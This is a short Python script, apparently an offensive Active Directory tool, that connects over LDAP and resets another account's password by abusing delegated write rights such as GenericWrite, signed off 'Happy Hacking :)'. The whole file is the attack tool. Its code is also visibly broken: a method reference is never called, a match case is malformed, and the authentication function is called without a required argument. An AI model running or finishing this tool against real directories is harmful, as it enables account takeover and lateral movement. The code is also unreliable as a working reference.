import ldap3
from ldap3 import Server, ALL, Connection, SAFE_RESTARTABLE, NTLM, ANONYMOUS, SIMPLE, SASL
import argparse
import json

argParser = argparse.ArgumentParser(prog = "LDAP Password Changer",
description = "Sign in to remote machine using ldap and change password of another user which the original user has permissions to make changes to(like GenericWrite)",
epilog = "Happy Hacking :)")
argParser.add_argument("-t", "--target", help = "hostname/ip to connect to", required = True)
argParser.add_argument("-u", "--authUser", help = "user to authorize as", required = True)
argParser.add_argument("-c", "--changeUser", help = "User who needs their password changed", required = True)
argParser.add_argument("-n", "--newPassword", help = "new password to set user's account to", required = True)
argParser.add_argument("-p", "--password", help = "password for authenticated user", required = True)
argParser.add_argument("-d", "--domain", help="domain to change password on")
argParser.add_argument("-a", "--authMethod", help="ldap3 authentication method to use, default is NTLM", default="NTLM")
argParser.add_argument("-s", "--secure", action="store_true", help="Use LDAPS")
args = argParser.parse_args()

def parse_auth_method():
	match args.authMethod.lower:
		case 'ntlm' or None:
			return NTLM
		case 'anonymous':
			return ANONYMOUS
		case 'simple':
			return SIMPLE
		case 'sasl':
			return SASL

def get_search_base(server):
	conn = Connection(server, auto_bind=True, client_strategy = SAFE_RESTARTABLE)
	cn = json.loads(server.info.to_json())['raw']['defaultNamingContext'][0]
	print(f'Search Base: {cn}')
	conn.unbind()
	return cn

def get_dn_from_search_base(search_base):
	components = search_base.split(',')
	domain_name = ''
	for index, comp in enumerate(components):
		domain_name += comp.split('=')[1]
		if index+1 < len(components):
			domain_name += '.'
	return domain_name

def authenticate(server, domain, auth):
	conn = Connection(server,
				user=f'{domain}\\{args.authUser}',
				password = args.password,
				client_strategy = SAFE_RESTARTABLE,
				auto_bind=True,
				authentication=auth)
	return conn

def get_user(auth_conn, search_base, domain):
	print(f'Searching for user: {args.changeUser}')
	search_result = auth_conn.search(search_base, f'(sAMAccountName={args.changeUser})')
	return search_result[2][0]['dn']

def change_password(auth_conn, user_dn):
	return auth_conn.extend.microsoft.modify_password(user_dn, args.newPassword, old_password=None)

if __name__ == "__main__":
	server = Server(host = args.target, get_info = ALL, use_ssl=args.secure)
	search_base = get_search_base(server)
	domain = args.domain if args.domain != None else get_dn_from_search_base(search_base)
	print(f'Using domain: {domain}')
	auth = parse_auth_method()
	auth_conn = authenticate(server, domain)
	user_dn = get_user(auth_conn, search_base, domain)
	print(f'Found User: {user_dn}')
	print('Password changed successfully') if change_password(auth_conn, user_dn) else print('Password change failed')
